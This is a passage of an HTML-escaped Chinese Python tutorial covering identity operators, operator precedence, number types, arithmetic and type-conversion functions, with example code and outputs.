&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;身份运算符&#34;&gt;&lt;a href=&#34;#身份运算符&#34; class=&#34;headerlink&#34; title=&#34;身份运算符&#34;&gt;&lt;/a&gt;身份运算符&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;a &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;
b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;

&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token keyword&#34;&gt;is&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;a 和 b 有相同的标识&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;a 和 b 没有相同的标识&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# a 和 b 有相同的标识&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;a 和 b 有相同的标识&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;a 和 b 没有相同的标识&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# a 和 b 有相同的标识&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 修改变量 b 的值&lt;/span&gt;
b &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;30&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token keyword&#34;&gt;is&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;a 和 b 有相同的标识&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;a 和 b 没有相同的标识&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# a 和 b 没有相同的标识&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a &lt;span class=&#34;token keyword&#34;&gt;is&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;not&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;a 和 b 没有相同的标识&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;a 和 b 有相同的标识&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# a 和 b 没有相同的标识    &lt;/span&gt;
&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
a 和 b 有相同的标识
a 和 b 有相同的标识
a 和 b 没有相同的标识
a 和 b 没有相同的标识
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;优先级&#34;&gt;&lt;a href=&#34;#优先级&#34; class=&#34;headerlink&#34; title=&#34;优先级&#34;&gt;&lt;/a&gt;优先级&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;运算符&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;**&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;指数 (最高优先级)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;~ + -&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;* / % //&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;乘，除，求余数和取整除&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;+ -&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;加法减法&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&amp;gt;&amp;gt; &amp;lt;&amp;lt;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;右移，左移运算符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&amp;amp;&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;位 ‘AND’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;^ |&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;位运算符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;&amp;lt;= &amp;lt; &amp;gt; &amp;gt;=&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;比较运算符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;== !=&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;等于运算符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;= %= /= //= -= += *= **=&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;赋值运算符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;is is not&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;身份运算符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;in not in&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;成员运算符&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;not and or&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;逻辑运算符&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h2 id=&#34;数字-Number&#34;&gt;&lt;a href=&#34;#数字-Number&#34; class=&#34;headerlink&#34; title=&#34;数字(Number)&#34;&gt;&lt;/a&gt;数字(Number)&lt;/h2&gt;&lt;p&gt;直接创建，不用特别定义类型&lt;/p&gt;
&lt;p&gt;支持int、float、bool、complex（复数）&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;var &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;
var1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; var1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 1 test&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;del&lt;/span&gt; var&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; var1 &lt;span class=&#34;token comment&#34;&gt;# 删除对象&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 8或者16进制表示数字&lt;/span&gt;
var &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0x99&lt;/span&gt;
var1 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0o43&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; var1&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 153 35&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;运算&#34;&gt;&lt;a href=&#34;#运算&#34; class=&#34;headerlink&#34; title=&#34;运算&#34;&gt;&lt;/a&gt;运算&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6.3&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 与浮点数运算结果为浮点数&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;**&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 乘方&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;6.5&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;//&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 向下取整&lt;/span&gt;
var &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 赋值&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;7&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;token comment&#34;&gt;# 取余&lt;/span&gt;
&lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;_&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;# 变量_是上一个表达式的值&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
4
2
6
2.1
9
2.0
1
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;数据类型转换函数&#34;&gt;&lt;a href=&#34;#数据类型转换函数&#34; class=&#34;headerlink&#34; title=&#34;数据类型转换函数&#34;&gt;&lt;/a&gt;数据类型转换函数&lt;/h3&gt;&lt;h5 id=&#34;class-int-x-base-10-1&#34;&gt;&lt;a href=&#34;#class-int-x-base-10-1&#34; class=&#34;headerlink&#34; title=&#34;class int(x, base=10)&#34;&gt;&lt;/a&gt;&lt;code&gt;class int(x, base=10)&lt;/code&gt;&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# x为数值型时,不写base,直接取整,x为str时,base为转换前的进制&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;3.6&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11.2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;12&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
3
-11
18
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;class-float-x-1&#34;&gt;&lt;a href=&#34;#class-float-x-1&#34; class=&#34;headerlink&#34; title=&#34;class float([x])&#34;&gt;&lt;/a&gt;&lt;code&gt;class float([x])&lt;/code&gt;&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 将整数和字符串转换成浮点数&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;float&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;float&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;11.2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;float&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;12&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
1.0
-11.2
12.0
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;class-complex-real-imag-1&#34;&gt;&lt;a href=&#34;#class-complex-real-imag-1&#34; class=&#34;headerlink&#34; title=&#34;class complex([real[, imag]])&#34;&gt;&lt;/a&gt;&lt;code&gt;class complex([real[, imag]])&lt;/code&gt;&lt;/h5&gt;&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 创建一个复数&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;complex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;complex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2j&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;complex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;1+3j&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;complex&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
(1+0j)
(1+2j)
(1+3j)
(1+2j)
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;数学函数&#34;&gt;&lt;a href=&#34;#数学函数&#34; class=&#34;headerlink&#34; title=&#34;数学函数&#34;&gt;&lt;/a&gt;数学函数&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;&lt;a href=&#34;https://www.runoob.com/python3/python3-func-number-abs.html&#34;&gt;abs(x)&lt;/a&gt;&lt;/th&gt;
&lt;th&gt;返回数字的绝对值，如abs(-10) 返回 10&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
